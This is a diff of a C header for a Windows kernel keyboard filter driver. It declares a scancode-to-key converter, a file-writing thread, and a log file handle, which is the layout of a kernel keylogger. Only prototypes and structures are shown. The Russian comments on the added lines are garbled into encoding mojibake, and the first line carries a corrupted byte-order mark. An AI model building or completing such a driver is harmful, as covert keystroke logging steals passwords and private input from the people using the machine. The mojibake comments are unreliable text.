@@ -1,15 +1,7 @@
-#include <ntddk.h>
+п»ї#include <ntddk.h>
 #include <ntddkbd.h>
 
-typedef struct 
-{
-	BOOLEAN shift;
-	BOOLEAN capslock;
-	BOOLEAN ctrl;
-	BOOLEAN alt;
-} KEY_STATE;
-
-//??? 
+//РЎРѕРґРµСЂР¶РёС‚ РёРЅС„РѕСЂРјР°С†РёСЋ Рѕ С‚РµРєСѓС‰РµР№ РєР»Р°РІРёС€Рµ
 typedef struct 
 {
 	LIST_ENTRY listNode;
@@ -18,54 +10,44 @@ typedef struct
 } KEY_DATA;
 
 
-
 typedef struct _DEVICE_EXTENSION
 {
-	PDEVICE_OBJECT pKeyboardDevice; //Указатель на след. устройство
+	PDEVICE_OBJECT pKeyboardDevice;
 	PETHREAD pThreadObj;
 	BOOLEAN bClosedThread;
 	HANDLE hLog;
-	KEY_STATE kState;
+	BOOLEAN shift;
 	KSEMAPHORE semaphore;
 	KSPIN_LOCK spinlock;
 	LIST_ENTRY listHead;
 } DEVICE_EXTENSION, *PDEVICE_EXTENSION;
 
-/*
-//Структура соответствует нажатой клавише
-typedef struct _KEYBOARD_INPUT_DATA {
-	USHORT unitId;
-	USHORT makeCode;
-	USHORT flags;
-	USHORT reserved;
-	ULONG extraInf;
-} KEYBOARD_INPUT_DATA, *PKEYBOARD_INPUT_DATA;
-*/
-
+//РџСЂРѕС†РµРґСѓСЂР° Р·Р°РІРµСЂС€РµРЅРёСЏ РѕР±СЂР°Р±РѕС‚РєРё IRP-РїР°РєРµС‚Р°
 NTSTATUS ReadCompleted(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context);
 
+//РћР±СЂР°Р±РѕС‚С‡РёРє РІСЃРµС… IRP РїР°РєРµС‚РѕРІ, РєСЂРѕРјРµ IRP_MJ_READ
 NTSTATUS DispatchSkip(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);
 
-//Обработка запросов на чтение
+//РћР±СЂР°Р±РѕС‚С‡РёРє РїР°РєРµС‚РѕРІ IRP_MJ_READ
 NTSTATUS DispatchRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);
 
-
-//Функция выгрузки драйвера
-VOID Unload(PDRIVER_OBJECT pDriverObject);
-
-//Установка фильтра
+//РЈСЃС‚Р°РЅРѕРІРєР° СѓСЃС‚СЂРѕР№СЃС‚РІР° РІ СЃС‚РµРє
 NTSTATUS InitializeKeyboardFilter(PDRIVER_OBJECT pDriverObject);
 
+//РџРѕС‚РѕРє РґР»СЏ Р·Р°РїРёСЃРё РІ С„Р°Р№Р»
 VOID ThreadForWriting(PVOID pContext);
 
-//Функция инициализации потока
+//Р¤СѓРЅРєС†РёСЏ РёРЅРёС†РёР°Р»РёР·Р°С†РёРё РїРѕС‚РѕРєР°
 NTSTATUS InitializeThread(PDRIVER_OBJECT pDriverObject);
 
+//РЎРѕР·РґР°РЅРёРµ СЃРїРёСЃРєР° Рё С„Р°Р№Р»Р° РґР»СЏ Р·Р°РїРёСЃРё
+NTSTATUS CreateListAndFile(PDRIVER_OBJECT pDriverObject);
+
+//РџСЂРµРѕР±СЂР°Р·РѕРІР°РЅРёРµ СЃРєР°РЅ-РєРѕРґРѕРІ РІ РєР»Р°РІРёС€Рё
 char* Scancode2Key(PDEVICE_EXTENSION pDeviceExtension, KEY_DATA* kData, char* keys);
 
-NTSTATUS CreateFile(PDRIVER_OBJECT pDriverObject);
-
-
-//Входная точка
+//Р’С…РѕРґРЅР°СЏ С‚РѕС‡РєР°
 NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath);
 
+//Р¤СѓРЅРєС†РёСЏ РІС‹РіСЂСѓР·РєРё РґСЂР°Р№РІРµСЂР°
+VOID Unload(PDRIVER_OBJECT pDriverObject);
